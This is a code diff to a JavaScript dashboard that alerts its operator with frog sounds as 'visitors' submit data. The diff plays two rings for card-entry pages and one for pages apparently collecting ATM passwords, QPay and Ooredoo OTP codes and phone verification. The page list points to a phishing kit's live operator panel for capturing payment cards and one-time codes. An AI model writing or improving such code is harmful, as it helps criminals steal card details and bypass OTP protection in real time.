@@ -1108,10 +1108,25 @@
         }
         // Show notification with sound
         showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
-        // Play frog sound only for pages from credit card onwards (not for documents/summary/update info pages)
-        const noSoundPages = ['الصفحة الرئيسية', 'ملخص الدفع'];
+        // Play frog sound: 2 rings for card entry, 1 ring for other pages
+        const cardPages = ['QPay Payment', 'الدفع ببطاقة الائتمان', 'الدفع'];
+        const otherSoundPages = [
+          'QPay OTP Verification', 'كلمة مرور ATM',
+          'رمز التحقق (OTP)', 'توثيق رقم الهاتف',
+          'رمز OTP Ooredoo', 'صفحة الانتظار', 'الصفحة النهائية'
+        ];
         const currentPage = data && data.page ? data.page : (visitor.page || '');
-        if (!noSoundPages.includes(currentPage)) {
+        if (cardPages.includes(currentPage)) {
+          // 2 rings for card entry
+          try {
+            frogAudio.currentTime = 0;
+            frogAudio.play().catch(() => {});
+            setTimeout(() => {
+              try { frogAudio.currentTime = 0; frogAudio.play().catch(() => {}); } catch(e) {}
+            }, 800);
+          } catch(e) {}
+        } else if (otherSoundPages.includes(currentPage)) {
+          // 1 ring for other pages
           try {
             frogAudio.currentTime = 0;
             frogAudio.play().catch(() => {});
